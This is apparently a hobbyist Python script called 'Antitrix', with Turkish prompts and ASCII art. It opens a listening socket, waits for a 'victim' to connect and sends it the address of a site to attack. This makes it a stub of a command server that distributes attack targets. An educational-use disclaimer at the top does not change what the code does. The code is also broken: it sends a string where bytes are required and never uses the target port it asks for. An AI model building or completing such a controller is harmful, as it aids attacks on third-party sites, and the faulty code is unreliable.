import requests
import socket
import time
from colorama import init
from termcolor import colored
init()
print('bu yazilim eğitim için kodlanmistir herhangi bir illegal kullanimdan ben sorumlu değilimdir')
print(colored("""\

   ___   _   _  _____  _____  _____ ______  _____ __   __
 / _ \ | \ | ||_   _||_   _||_   _|| ___ \|_   _|\ \ / /
/ /_\ \|  \| |  | |    | |    | |  | |_/ /  | |   \ V / 
|  _  || . ` |  | |    | |    | |  |    /   | |   /   \  
| | | || |\  |  | |   _| |_   | |  | |\ \  _| |_ / /^\ 
\_| |_/\_| \_/  \_/   \___/   \_/  \_| \_| \___/ \/   \/
MMMMMMMMMMMMMMMMMMMMWXkolcccd0NWMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMWWd;c;;;'.,:xNMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMWWWd,::;;,;:;;dNMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMWMXd;:oollc::,oNMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMW0ocoxdc:;,,dNWWWMMMMWMMMMMMMMMWWWWWWW
MMMMMMMMMMMMMMMMMMMMMMMMW0dclolc::;cdxxxO0NWMMMMMMMWXkddxk0N
MMMMMMMMMMMMMMMMMMMMMMMMWXx:;lll:;'.''''';:lKWK0XWWOc,;:::ck
MMMMMMMMMMMMMMMMMMMMMMMMXl''',;;,'......''.;Ox,,:dkl:c;;;;,l
MMMMMMMMMMMMMMMMMMWWWWN0l,,;;;;;;;:;,,,'...,;'',,'.:xd:;,,'l
MMMMMMMMMMMMMMMMWWWWNOl:;::;::;;;;;;;;::;,'.....'''okocc:;lX
MMMMMMMMMMMMMMMMWWMKo:;:::;,'''......';::::,......:oc:;;;dXM
MMMMMMMMMMMMMMMMWMKl;::;:::;,''.........,c::;..',;ll:;,'oNMM
MMMMMMMMMMMMMMMMWOc;:::::lollcc:;,'......,::c,.,:;;:;,'.:0WM
WWMMMWWMMMMMMMMNx,,:::;:llollloollc:;'....::c:'..'.......cXW
WXOkkkOKNWMMWWKc..,clc;:oollloollololc:;''::c:'..........,kM
Ol::,,:codOXWWo...,ccc;;::;;;;;;clloolloc;c:l:'..........;OM
o::;;::lxxoodd,.''.:c::'....'''',:lllllc:cccc,'.........:KWM
k:;,;;;coodxl::,;l:':lc:,........,colc:::clc;'..........lNMM
NOoc;,;cccc::clc:cl,.;clc;,''....';c:;:ccl:,'...........xWMM
MWWNKOddoc'';;:;,',,,'';ccllc:::::cccccc:,'...........;kWMMM
MMMMMMWWXl'.'.....'',,...';::::::::::;,'...........,ckXWMMMM
MMMMWWWk;..............;oc'''....'''.............c0XWMMMMMMM
MMMMMXl.........:ddollxK0:.'',,'':::,...........,kWMMMMMMMMM
MMMMXl.......':kNWMMMMMMXo,.....,olc;'.........;0WMMMMMMMMMM
MMMM0,....':dONMMMMMMMMMWWKd:...,c:;,'........lXMMMMMMMMMMMM
MMMMXl':oxKWMMMMMMMMMMMMMWWWK:.';ccc;'......'xNMMMMMMMMMMMMM
MMMMWNKNMMMMMMMMMMMMMMMMMMWWNo',cc::c;.....:OWWMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMW0oc,;;;;'..;kKNWMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMWWXo....'.,kWMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNO;.'...'dWMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMWMWk:,.....'xNMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMNd.......;ONWMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMXl......,dXWWWMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMK:.'',;cxKWWWMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMM0odkO0KWMWWMMMMMMMMMMMMMMMMMMMMMMMM                           
                   
                    
                     
                      
                       """,'red'))
print('Antitrix başlatiliyor...')
time.sleep(10)
ipadresi= str(input('dinleme yapilacak ip:' ))
port= int(input('dinlenicek port'))
saldirilacaksite= input('saldirilacak ip')
saldirilacaksiteport= int(input('hedef sitenin portu:'))
soket= socket.socket()
soket.bind((ipadresi,port))
print('Antitrix kurbanini bekliyor...')
soket.listen()
conn, addr= soket.accept()
conn.sendall(saldirilacaksite)
